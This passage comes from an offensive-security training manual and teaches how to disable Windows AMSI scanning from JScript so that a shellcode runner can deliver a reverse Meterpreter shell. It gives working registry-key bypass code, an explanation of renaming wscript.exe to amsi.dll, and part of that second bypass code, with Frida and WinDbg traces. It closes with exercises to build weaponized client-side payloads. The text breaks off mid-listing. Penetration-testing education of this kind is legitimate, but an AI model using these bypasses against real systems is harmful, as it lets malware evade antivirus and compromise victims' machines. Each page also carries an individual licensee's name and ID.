hiding the PowerShell window and cleaning up the registry, but this is unnecessary for the 
purposes of our case study. 
7.5.2.1 Exercises 
1. 
Recreate the UAC bypass while evading AMSI with any of the AMSI bypasses. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
251 
2. 
Use a compiled C# assembly instead of a PowerShell shellcode runner to evade AMSI and 
bypass UAC. 
7.6 Bypassing AMSI in JScript 
Since AMSI also scans Jscript code, we’ll revisit our DotNetToJscript techniques and develop 
Jscript AMSI bypasses. 
7.6.1 Detecting the AMSI API Flow 
First, we’ll use Frida to determine how the Jscript implementation of AMSI compares to the 
PowerShell implementation. 
Since our Jscript code is executed by wscript.exe, we must instrument that with Frida. The issue 
is that the process must be created before we launch Frida, but wscript.exe terminates as soon 
as the script completes. 
To solve this, we’ll create the following .js Jscript test file: 
WScript.Sleep(20000); 
 
var WshShell = new ActiveXObject("WScript.Shell"); 
WshShell.Run("calc") 
Listing 313 - Jscript code that sleeps and then starts the calculator 
First, we paused execution for 20 seconds with the Sleep389 method. This delay helps us identify 
the process ID of the wscript.exe process with Process Explorer, start the frida-trace 
command, and allow it to hook the APIs. 
Next, we instantiated the Shell object and used that to start the calculator. Due to the delay, we 
can attach Frida and detect the second part of the code being processed by AMSI. 
After entering this code, we’ll double-click the Jscript file, locate the process ID in Process 
Explorer, and start Frida: 
C:\Users\Offsec> frida-trace -p 708 -x amsi.dll -i Amsi* 
Instrumenting functions... 
AmsiOpenSession: Loaded handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiOpenSession.js" 
AmsiUninitialize: Loaded handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiUninitialize.js" 
AmsiScanBuffer: Loaded handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiScanBuffer.js" 
AmsiUacInitialize: Loaded handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiUacInitialize.js" 
AmsiInitialize: Loaded handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiInitialize.js" 
AmsiCloseSession: Loaded handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiCloseSession.js" 
AmsiScanString: Loaded handler at 
 
389 (SS64, 2020), https://ss64.com/vb/sleep.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
252 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiScanString.js" 
AmsiUacUninitialize: Loaded handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiUacUninitialize.js" 
AmsiUacScan: Loaded handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiUacScan.js" 
Started tracing 9 functions. Press Ctrl+C to stop. 
           /* TID 0x144c */ 
 12118 ms  AmsiScanString() 
 12118 ms     | [*] AmsiScanBuffer() 
 12118 ms     | |- amsiContext: 0x28728e17c80 
 12118 ms     | |- buffer: IHost.Sleep("20000"); 
IWshShell3.Run("calc"); 
 
 12118 ms     | |- length: 0x60 
 12118 ms     | |- contentName 0x28728e35f08 
 12118 ms     | |- amsiSession 0x0 
 12118 ms     | |- result 0xf97dafdc00 
 
 12128 ms     | [*] AmsiScanBuffer() Exit 
 12128 ms     | |- Result value is: 1 
 
 12181 ms  AmsiUninitialize() 
Process terminated 
Listing 314 - Hooking AMSI calls in wscript.exe with Frida 
This output indicates that AmsiScanString and AmsiScanBuffer were called but AmsiOpenSession 
was not. This is because Jscript handles each command in a single session while PowerShell 
processes each in a separate session. 
On the surface, the interaction between wscript.exe and AMSI appears similar to that of 
PowerShell, although the commands submitted to AMSI (as highlighted in Listing 314) have been 
partly processed and do not match the code in the script. 
To observe AMSI in action against the DotNetToJscript shellcode runner we developed in a 
previous module, let’s reuse it and execute it on the Windows 10 victim machine. Recall that we 
compiled the C# shellcode runner into a managed DLL and transformed it into a Jscript file with 
the DotNetToJscript executable. 
If we simply execute it, we find that wscript.exe starts but the shell is not launched. To investigate 
deeper, we’ll prepend the shellcode runner with the same Sleep statement and hook it with Frida: 
          /* TID 0x690 */ 
  7667 ms  AmsiScanString() 
  7667 ms     | [*] AmsiScanBuffer() 
  7667 ms     | |- amsiContext: 0x26e81c079d0 
  7667 ms     | |- buffer: IHost.Sleep("20000"); 
IWshShell3.Environment("Process"); 
IWshEnvironment.Item("COMPLUS_Version", "v4.0.30319"); 
_ASCIIEncoding._6002000f("AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxp
emF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaW
FsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb2"); 
_ASCIIEncoding._60020014("AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxp
emF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaW
FsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb2"); 
_FromBase64Transform._60020009("Unsupported parameter type 00002011", "0", "9924"); 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
253 
_MemoryStream._60020017("Unsupported parameter type 00002011", "0", "7443"); 
_MemoryStream._6002000b("0"); 
_BinaryFormatter._60020006("Unsupported parameter type 00000009"); 
_ArrayList._60020020("Unsupported parameter type 00000000"); 
_ArrayList._6002001b(); 
_HeaderHandler._60020007("Unsupported parameter type 0000200c"); 
 
  7667 ms     | |- length: 0x818 
  7667 ms     | |- contentName 0x26e9c8f6918 
  7667 ms     | |- amsiSession 0x0 
  7667 ms     | |- result 0xd9cedfdd20 
 
  7717 ms     | [*] AmsiScanBuffer() Exit 
  7717 ms     | |- Result value is: 32768 
 
  7720 ms  AmsiUninitialize() 
Listing 315 - Hooking shellcode runner script with Frida 
Towards the end of the output, AMSI returns a value of 32768, indicating Windows Defender 
flagged the code as malicious. In this case, there is no doubt that AMSI is catching our 
DotNetToJscript technique. 
7.6.1.1 Exercise 
1. 
Perform the hooking of wscript.exe with Frida and locate the malicious detection by AMSI 
and Windows Defender. 
7.6.2 Is That Your Registry Key? 
In order to use a DotNetToJscript payload, we’ll need to bypass AMSI. However, when bypassing 
AMSI in PowerShell, we relied on reflection or Win32 APIs, but these techniques are not available 
from Jscript. 
Security researcher @Tal_Liberman discovered that Jscript tries to query the “AmsiEnable” 
registry key from the HKCU hive before initializing AMSI.390 If this key is set to “0”, AMSI is not 
enabled for the Jscript process. 
This query is performed in the JAmsi::JAmsiIsEnabledByRegistry function inside Jscript.dll, which 
is only called when wscript.exe is started. Let’s use WinDbg to attempt to discover the exact 
registry query. 
We’ll open WinDbg, navigate to File -> Open Executable… and enter the full path of wscript.exe 
along with the full path of our testing Jscript file (Figure 92). 
 
390 (Dominic Shell, 2019), https://hackinparis.com/data/slides/2019/talks/HIP2019-Dominic_Chell-
Cracking_The_Perimeter_With_Sharpshooter.pdf 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
254 
 
Figure 92: Starting wscript.exe from WinDbg 
With wscript.exe started, we’ll set a breakpoint on jscript!JAmsi::JAmsiIsEnabledByRegistry with 
bu: 
0:000> bu jscript!JAmsi::JAmsiIsEnabledByRegistry 
 
0:000> g 
ModLoad: 00007fff`d3350000 00007fff`d337e000   C:\Windows\System32\IMM32.DLL 
ModLoad: 00007fff`cf4d0000 00007fff`cf4e1000   C:\Windows\System32\kernel.appcore.dll 
ModLoad: 00007fff`cdad0000 00007fff`cdb6c000   C:\Windows\system32\uxtheme.dll 
ModLoad: 00007fff`cf280000 00007fff`cf31b000   C:\Windows\SYSTEM32\sxs.dll 
ModLoad: 00007fff`d2700000 00007fff`d286a000   C:\Windows\System32\MSCTF.dll 
ModLoad: 00007fff`cdee0000 00007fff`cdf0e000   C:\Windows\system32\dwmapi.dll 
ModLoad: 00007fff`d01b0000 00007fff`d038b000   C:\Windows\System32\CRYPT32.dll 
ModLoad: 00007fff`cf4b0000 00007fff`cf4c2000   C:\Windows\System32\MSASN1.dll 
ModLoad: 00007fff`cfd80000 00007fff`cfd97000   C:\Windows\System32\CRYPTSP.dll 
ModLoad: 00007fff`d2b00000 00007fff`d2ba2000   C:\Windows\System32\clbcatq.dll 
ModLoad: 00007fff`a3a70000 00007fff`a3b41000   C:\Windows\System32\jscript.dll 
ModLoad: 00007fff`d3000000 00007fff`d3052000   C:\Windows\System32\SHLWAPI.dll 
Breakpoint 0 hit 
jscript!JAmsi::JAmsiIsEnabledByRegistry: 
00007fff`a3a868c4 48894c2408      mov     qword ptr [rsp+8],rcx 
ss:000000e5`933bcfc0=000000e5933bd098 
Listing 316 - Setting a breakpoint on AmsiScanBuffer 
The breakpoint is triggered and we can now track the execution of the function. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
255 
 
Since jscript.dll is not loaded when we set the breakpoint, we cannot use bp and 
must instead use the unresolved breakpoint command bu that tracks loaded 
modules. As soon as jscript.dll is loaded, it will set the breakpoint automatically. 
Next, we’ll unassemble the beginning of the function to better understand the function’s layout: 
0:000> u rip L20 
jscript!JAmsi::JAmsiIsEnabledByRegistry: 
00007fff`a3a868c4 48894c2408      mov     qword ptr [rsp+8],rcx 
00007fff`a3a868c9 53              push    rbx 
00007fff`a3a868ca 4883ec30        sub     rsp,30h 
00007fff`a3a868ce 8b05183e0a00    mov     eax,dword ptr [jscript!g_AmsiEnabled 
(00007fff`a3b2a6ec)] 
00007fff`a3a868d4 85c0            test    eax,eax 
00007fff`a3a868d6 0f8480000000    je      jscript!JAmsi::JAmsiIsEnabledByRegistry+0x98 
(00007fff`a3a8695c) 
00007fff`a3a868dc 7f76            jg      jscript!JAmsi::JAmsiIsEnabledByRegistry+0x90 
(00007fff`a3a86954) 
00007fff`a3a868de 488d442458      lea     rax,[rsp+58h] 
00007fff`a3a868e3 41b919000200    mov     r9d,20019h 
00007fff`a3a868e9 4533c0          xor     r8d,r8d 
00007fff`a3a868ec 4889442420      mov     qword ptr [rsp+20h],rax 
00007fff`a3a868f1 488d15e8cb0800  lea     rdx,[jscript!`string' (00007fff`a3b134e0)] 
00007fff`a3a868f8 48c7c101000080  mov     rcx,0FFFFFFFF80000001h 
00007fff`a3a868ff ff15f3a60800    call    qword ptr [jscript!_imp_RegOpenKeyExW 
(00007fff`a3b10ff8)] 
00007fff`a3a86905 85c0            test    eax,eax 
00007fff`a3a86907 754b            jne     jscript!JAmsi::JAmsiIsEnabledByRegistry+0x90 
(00007fff`a3a86954) 
00007fff`a3a86909 488b4c2458      mov     rcx,qword ptr [rsp+58h] 
00007fff`a3a8690e 488d442440      lea     rax,[rsp+40h] 
00007fff`a3a86913 4889442428      mov     qword ptr [rsp+28h],rax 
00007fff`a3a86918 4c8d4c2448      lea     r9,[rsp+48h] 
00007fff`a3a8691d 488d442450      lea     rax,[rsp+50h] 
00007fff`a3a86922 c744244004000000 mov     dword ptr [rsp+40h],4 
00007fff`a3a8692a 4533c0          xor     r8d,r8d 
00007fff`a3a8692d 4889442420      mov     qword ptr [rsp+20h],rax 
00007fff`a3a86932 488d1587cb0800  lea     rdx,[jscript!`string' (00007fff`a3b134c0)] 
00007fff`a3a86939 ff15b1a60800    call    qword ptr [jscript!_imp_RegQueryValueExW 
(00007fff`a3b10ff0)] 
00007fff`a3a8693f 488b4c2458      mov     rcx,qword ptr [rsp+58h] 
00007fff`a3a86944 8bd8            mov     ebx,eax 
00007fff`a3a86946 ff158ca60800    call    qword ptr [jscript!_imp_RegCloseKey 
(00007fff`a3b10fd8)] 
00007fff`a3a8694c 85db            test    ebx,ebx 
00007fff`a3a8694e 0f84144e0200    je      
jscript!JAmsi::JAmsiIsEnabledByRegistry+0x24ea4 (00007fff`a3aab768) 
00007fff`a3a86954 b001            mov     al,1 
Listing 317 - Unassembling start of JAmsi::JAmsiIsEnabledByRegistry 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
256 
The highlighted call to the Win32 RegOpenKeyExW391 API opens the registry key, which is supplied 
as the second argument. Due to the _fastcall calling convention, the second argument is supplied 
in RDX and in this instance is equal to 7fff`a3b134e0. We can display the contents at that address 
with WinDbg to identify the registry key: 
0:000> du 00007fff`a3b134e0 
00007fff`a3b134e0  "SOFTWARE\Microsoft\Windows Scrip" 
00007fff`a3b13520  "t\Settings" 
Listing 318 - Registry path given as argument to RegOpenKeyExW 
This reveals the SOFTWARE\Microsoft\Windows Script\Settings registry path. 
A subsequent call to RegQueryValueExW392 highlighted in Listing 317 is used to query the registry 
value. The name of the registry key is also supplied as the second argument (RDX) to this API so 
we can dump it in WinDbg: 
0:000> du 7fff`a3b134c0 
00007fff`a3b134c0  "AmsiEnable" 
Listing 319 - Registry key given as argument to RegQueryValueExW 
We now have the full path to the registry key. In order to bypass AMSI, we’ll create the key and set 
its value to “0” with the RegWrite393 method from the WScript.Shell object. This method accepts 
the full registry key, the value content, and the value data type as shown in the Jscript code below: 
var sh = new ActiveXObject('WScript.Shell'); 
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable"; 
sh.RegWrite(key, 0, "REG_DWORD"); 
Listing 320 - Creating and writing the registry key AmsiEnable 
Now that the registry key is set, let’s rerun the previous DotNetToJscript-converted shellcode 
runner with the included sleep timer and invoke Frida to hook the AMSI APIs: 
C:\Users\Offsec> frida-trace -p 5772  -x amsi.dll -i Amsi* 
Instrumenting functions... 
AmsiOpenSession: Loaded handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiOpenSession.js" 
AmsiUninitialize: Loaded handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiUninitialize.js" 
AmsiScanBuffer: Loaded handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiScanBuffer.js" 
AmsiUacInitialize: Loaded handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiUacInitialize.js" 
AmsiInitialize: Loaded handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiInitialize.js" 
AmsiCloseSession: Loaded handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiCloseSession.js" 
AmsiScanString: Loaded handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiScanString.js" 
AmsiUacUninitialize: Loaded handler at 
 
391 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexw 
392 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryvalueexw 
393 (SS64, 2020), https://ss64.com/vb/regwrite.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
257 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiUacUninitialize.js" 
AmsiUacScan: Loaded handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiUacScan.js" 
Started tracing 9 functions. Press Ctrl+C to stop. 
Process terminated 
Listing 321 - No calls to AMSI APIs are performed 
According to this output (Listing 321), AmsiScanBuffer and AmsiScanString were not invoked. In 
addition, our shellcode runner generates a reverse Meterpreter shell. This bypass works very well! 
Although this bypass was successful, it only works if the registry key is set before the wscript.exe 
process is started. Let’s improve our technique by implementing a check for the AmsiEnable 
registry key. If it exists, we’ll execute the shellcode runner, but if it doesn’t, we’ll create it and 
execute the Jscript again. 
The full code, excluding the shellcode runner itself, is shown in Listing 322.394 
var sh = new ActiveXObject('WScript.Shell'); 
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable"; 
try{ 
    var AmsiEnable = sh.RegRead(key); 
    if(AmsiEnable!=0){ 
    throw new Error(1, ''); 
    } 
}catch(e){ 
    sh.RegWrite(key, 0, "REG_DWORD"); 
    sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} 
"+WScript.ScriptFullName,0,1); 
    sh.RegWrite(key, 1, "REG_DWORD"); 
    WScript.Quit(1); 
} 
Listing 322 - AMSI bypass by setting the AmsiEnable key 
Let’s unpack a few elements of this code. First, the code is wrapped in try and catch exception 
handling statements.395 
As in many other languages, the code inside the try bracket is executed and if an exception 
occurs, the code inside the catch statement is executed. Otherwise, execution will continue past 
the try and catch statements. 
Inside the try statement, we call RegRead396 to determine if the AmsiEnable key is already set. If it 
isn’t, the throw397 statement along with the new Error398 constructor throws a new exception. If 
this happens, the code inside the catch statement is executed, setting the AmsiEnable value and 
invoking the Run399 method. 
 
394 (MDSec, 2019), https://github.com/mdsecactivebreach/SharpShooter/blob/master/modules/amsikiller.py 
395 (W3Schools, 2020), https://www.w3schools.com/js/js_errors.asp 
396 (SS64, 2020), https://ss64.com/vb/regread.html 
397 (W3Schools, 2020), https://www.w3schools.com/js/js_errors.asp 
398 (Mozilla, 202), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error 
399 (SS64, 2020), https://ss64.com/vb/run.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
258 
The arguments for the call to the Run method are important. First, we specify the cscript.exe400 
executable, which is the command-line equivalent of wscript.exe. 
Next, we use -e to specify which scripting engine will execute the script. The highlighted value in 
Listing 322 is a globally unique identifier (GUID),401 which when used in this manner may be 
understood as a registry entry under HKLM\SOFTWARE\Classes\CLSID. 
If we navigate to the registry path and locate the key with the correct GUID, we’ll find an entry 
associated with Jscript and jscript.dll as displayed in Figure 93. 
 
Figure 93: GUID registry entry for jscript.dll 
In essence, the -e option indicates that the specified script file will be processed by jscript.dll. 
The script file must be the original Jscript and we provide this through the ScriptFullName402 
property as shown in Listing 323, where we repeat the Run method. 
sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} 
"+WScript.ScriptFullName,0,1); 
Listing 323 - Recap of the Run method invocation 
As highlighted in Listing 323, we supply an additional two arguments to the Run method after the 
script file. The first is the windows style where “0” specifies that the window be hidden. For the 
second argument, we specify “1”, which will cause execution to wait for the script executed by the 
Run method to be completed. 
With this bypass in place, we can prepend it to the DotNetToJscript-generated shellcode runner. 
When we run it, we bypass AMSI and generate a reverse shell. 
7.6.2.1 Exercises 
1. 
Set the registry key and check that AMSI is bypassed. 
2. 
Combine the AMSI bypass with the shellcode runner, writing fully-weaponized client-side 
code execution with Jscript. 
3. 
Experiment with SharpShooter to generate the same type of payload with an AMSI bypass. 
 
400 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cscript 
401 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Universally_unique_identifier 
402 (SS64, 2020), https://ss64.com/vb/syntax-wscript.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
259 
7.6.3 I Am My Own Executable 
The bypass presented in the previous section disabled AMSI by setting a registry key, which is 
very different than the approach we used to disable AMSI from PowerShell. 
For PowerShell, we focused on causing an error with AMSI-related information or modifying the 
AMSI APIs to return an error. In this section, we’ll perform a simple trick to obtain a similar result. 
While we cannot locate any of the structures to interact with the Win32 APIs from Jscript, we 
know that AMSI requires AMSI.DLL. If we could prevent AMSI.DLL from loading or load our own 
version of it, we could force the AMSI implementation in wscript.exe to produce an error and 
abort. 
While it seems logical to attempt to simply overwrite AMSI.DLL, we must have administrative 
permissions to overwrite anything in C:\Windows\System32. We could, however, perform a DLL 
hijacking attack403 by exploiting the DLL search order. 
To determine if this is possible, we’ll use WinDbg to inspect the AMSI.DLL loading process. To do 
this, we’ll once again launch the wscript.exe process through File > Open Executable…, and open 
the unmodified DotNetToJscript shellcode runner Jscript file. 
Once WinDbg has launched wscript.exe and a bare minimum of modules, it breaks the execution 
flow. Listing the loaded modules (lm)404 and searching for a module named amsi (m amsi) 
reveals that AMSI.DLL has not yet loaded. 
0:000> lm m amsi 
Browse full module list 
start             end                 module name 
 
Listing 324 - AMSI.DLL is not yet loaded into the process 
At this point, we need to determine what, exactly, is loading AMSI.DLL. To determine this, we must 
stop WinDbg as soon as this DLL is loaded. 
One way to accomplish this is to instruct the debugger to catch the load of the DLL in WinDbg. 
We can do this with the sxe405 command along with the ld406 subcommand to detect when a 
module is loaded by supplying the name as an argument. 
The full command and the resulting output is shown in Listing 325. 
0:000> sxe ld amsi 
 
0:000> g 
ModLoad: 00007fff`d3350000 00007fff`d337e000   C:\Windows\System32\IMM32.DLL 
ModLoad: 00007fff`cf4d0000 00007fff`cf4e1000   C:\Windows\System32\kernel.appcore.dll 
ModLoad: 00007fff`cdad0000 00007fff`cdb6c000   C:\Windows\system32\uxtheme.dll 
 
403 (Mitre, 2020), https://attack.mitre.org/techniques/T1038/ 
404 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/lm\-\-list-loaded-modules- 
405 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/sx\-\-sxd\-\-sxe\-\-sxi\-\-sxn\-\-sxr\-\-
sx\-\-\-set-exceptions- 
406 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/ld\-\-load-symbols- 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
260 
ModLoad: 00007fff`cf280000 00007fff`cf31b000   C:\Windows\SYSTEM32\sxs.dll 
ModLoad: 00007fff`d2700000 00007fff`d286a000   C:\Windows\System32\MSCTF.dll 
ModLoad: 00007fff`cdee0000 00007fff`cdf0e000   C:\Windows\system32\dwmapi.dll 
ModLoad: 00007fff`d01b0000 00007fff`d038b000   C:\Windows\System32\CRYPT32.dll 
ModLoad: 00007fff`cf4b0000 00007fff`cf4c2000   C:\Windows\System32\MSASN1.dll 
ModLoad: 00007fff`cfd80000 00007fff`cfd97000   C:\Windows\System32\CRYPTSP.dll 
ModLoad: 00007fff`d2b00000 00007fff`d2ba2000   C:\Windows\System32\clbcatq.dll 
ModLoad: 00007fff`a3a70000 00007fff`a3b41000   C:\Windows\System32\jscript.dll 
ModLoad: 00007fff`d3000000 00007fff`d3052000   C:\Windows\System32\SHLWAPI.dll 
ModLoad: 00007fff`c6e20000 00007fff`c6e34000   C:\Windows\SYSTEM32\amsi.dll 
ntdll!NtMapViewOfSection+0x14: 
00007fff`d351ea94 c3              ret 
 
0:000> lm m amsi 
Browse full module list 
start             end                 module name 
00007fff`c6e20000 00007fff`c6e34000   amsi       (deferred)    
Listing 325 - WinDbg breaking when AMSI.DLL is loaded 
In the highlighted section of Listing 325, AMSI.DLL is loaded and the lm command correctly 
displays it as in the process. 
Next, we need to locate the code responsible for loading AMSI.DLL. A DLL is typically loaded 
through the Win32 LoadLibrary407 or LoadLibraryEx408 APIs so we must look for that function and 
see what function invoked it. 
We are searching for the callstack or the backtrace, which is the list of called functions that led to 
the current execution point. We can list this with the k409 command as shown in Listing 326. 
0:000> k 
 # Child-SP          RetAddr           Call Site 
00 00000085`733ec8f8 00007fff`d34ca369 ntdll!NtMapViewOfSection+0x14 
01 00000085`733ec900 00007fff`d34ca4b7 ntdll!LdrpMinimalMapModule+0x101 
02 00000085`733ec9c0 00007fff`d34cbcfd ntdll!LdrpMapDllWithSectionHandle+0x1b 
03 00000085`733eca20 00007fff`d34cd75a ntdll!LdrpMapDllNtFileName+0x189 
04 00000085`733ecb20 00007fff`d34ce21f ntdll!LdrpMapDllSearchPath+0x1de 
05 00000085`733ecd80 00007fff`d34c5496 ntdll!LdrpProcessWork+0x123 
06 00000085`733ecde0 00007fff`d34c25e4 ntdll!LdrpLoadDllInternal+0x13e 
07 00000085`733ece60 00007fff`d34c1874 ntdll!LdrpLoadDll+0xa8 
08 00000085`733ed010 00007fff`cff40391 ntdll!LdrLoadDll+0xe4 
09 00000085`733ed100 00007fff`a3a84ed8 KERNELBASE!LoadLibraryExW+0x161 
0a 00000085`733ed170 00007fff`a3a84c6c jscript!COleScript::Initialize+0x2c 
0b 00000085`733ed1a0 00007fff`d2cffda1 
jscript!CJScriptClassFactory::CreateInstance+0x5c 
... 
Listing 326 - The current callstack when AMSI.DLL is being loaded 
 
407 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya 
408 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexw 
409 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/k\-\-kb\-\-kc\-\-kd\-\-kp\-\-kp\-\-kv\-\-
display-stack-backtrace- 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
261 
Since the callstack is often very long, the listing above has been truncated. The excerpt reveals 
the call to LoadLibraryExW, which loaded AMSI.DLL along with its calling function 
COleScript::Initialize. 
We can unassemble the function in the callstack to inspect the arguments supplied to 
LoadLibraryExW: 
0:000> u jscript!COleScript::Initialize LA 
jscript!COleScript::Initialize: 
00007fff`a3a84eac 48895c2418      mov     qword ptr [rsp+18h],rbx 
00007fff`a3a84eb1 4889742420      mov     qword ptr [rsp+20h],rsi 
00007fff`a3a84eb6 48894c2408      mov     qword ptr [rsp+8],rcx 
00007fff`a3a84ebb 57              push    rdi 
00007fff`a3a84ebc 4883ec20        sub     rsp,20h 
00007fff`a3a84ec0 488bf9          mov     rdi,rcx 
00007fff`a3a84ec3 33d2            xor     edx,edx 
00007fff`a3a84ec5 41b800080000    mov     r8d,800h 
00007fff`a3a84ecb 488d0ddee40800  lea     rcx,[jscript!`string' (00007fff`a3b133b0)] 
00007fff`a3a84ed2 ff15d0c10800    call    qword ptr [jscript!_imp_LoadLibraryExW 
(00007fff`a3b110a8)] 
 
0:000> du 7fff`a3b133b0 
00007fff`a3b133b0  "amsi.dll" 
Listing 327 - COleScript::Initialize is loading AMSI.DLL 
According to the LoadLibraryExW410 function prototype, the first argument is the name of the DLL 
to load. The last lines of Listing 327 reveals that the name of the DLL is “amsi.dll”, listed without a 
full path. 
This is significant considering the DLL search order.411 When a full path is not provided, the folder 
of the launched application is searched first. If we copy wscript.exe to a writable location and 
place a custom version of AMSI.DLL in the same folder, this could open up an attack vector. 
However, LoadLibraryExW can accept additional arguments and the third argument modifies the 
function’s default behavior. In this case, R8 (the third argument) is set to 0x800 (as highlighted in 
Listing 327). This is equivalent to the enum LOAD_LIBRARY_SEARCH_SYSTEM32, which forces 
the function to search in the C:\Windows\System32 directory first. 
This prevents a DLL hijacking attack. Security researcher James Forshaw discovered an 
interesting way around this.412 Instead of trying to hijack the DLL loading, James suggests 
renaming wscript.exe to amsi.dll and executing it. 
There are two important things to note about this approach. First, if a process named “amsi.dll” 
tries to load a DLL of the same name, LoadLibraryExW will report that it’s already in memory and 
abort the load to improve efficiency. Obviously, any subsequent attempts to use the AMSI APIs 
will fail, causing AMSI itself to fail and be disabled, leaving us with an AMSI bypass. 
 
410 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexw 
411 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order 
412 (James Forshaw, 2018), https://tyranidslair.blogspot.com/2018/06/disabling-amsi-in-jscript-with-one.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
262 
The second important thing to note is that double-clicking or running a file with a .dll extension 
will fail since DLLs are normally loaded, not executed. This behavior is actually caused by the 
Win32 ShellExecute413 API, which is used by cmd.exe. 
However, if we instead use the CreateProcess414 Win32 API, the file extension is ignored and the 
file header would be parsed to determine if it is a valid executable. We cannot directly call this API, 
but we can use the Exec415 method of the WScript.Shell object since it’s just a wrapper for it. 
Implementing this AMSI bypass requires a few new actions. When the Jscript is executed, it will 
copy wscript.exe to a writable and executable folder, naming it “amsi.dll”. Then, it will execute this 
copy while supplying the original Jscript file as in the previous bypass. 
We check for the existence of AMSI.dll with try and catch statements to determine if the Jscript 
file is being executed for the first or the second time. 
Our updated bypass code is listed below: 
var filesys= new ActiveXObject("Scripting.FileSystemObject"); 
var sh = new ActiveXObject('WScript.Shell'); 
try 
{ 
    if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0) 
    { 
        throw new Error(1, ''); 
    } 
} 
catch(e) 
{ 
